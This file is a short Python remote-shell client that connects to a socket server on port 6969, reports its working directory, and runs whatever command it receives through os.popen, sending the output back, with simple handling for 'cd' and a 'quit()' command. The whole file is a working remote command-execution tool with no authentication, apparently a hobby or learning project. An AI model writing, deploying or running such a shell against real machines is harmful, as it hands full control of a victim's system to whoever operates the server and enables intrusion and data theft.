import socket, os

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = socket.gethostname()
port = 6969

server.connect((host, port))

msg = server.recv(1024)
print(msg.decode('utf-8') + "\n")

emptyResponseCommands = ["cls"]

while True:
    cwd = os.getcwd().encode("utf-8")
    server.send(cwd)

    command = server.recv(1024).decode("utf-8")

    if command == "quit()":
        server.close()
        print("\nConnection Terminated.")
        break
    else:
        print(command)

        if command == "cd ..":
            curDir = cwd.decode("utf-8").split("\\")
            os.chdir("\\".join(curDir[:len(curDir)-1]))
            server.send(b"COMMAND EXCPETION.")
        elif "cd" in command and command != "cd .." and len(command) > 2:
            newDir = command.split(" ")[1]
            newDir = cwd.decode("utf-8") + "\\" + newDir
            os.chdir(newDir)
            server.send(b"COMMAND EXCPETION.")
        elif command == "RESPOND NULL":
            continue
        elif command in emptyResponseCommands:
            server.send(b"This command is currently not supported.\n")
        else:
            output = os.popen(command).read().encode("utf-8")
            server.send(output)
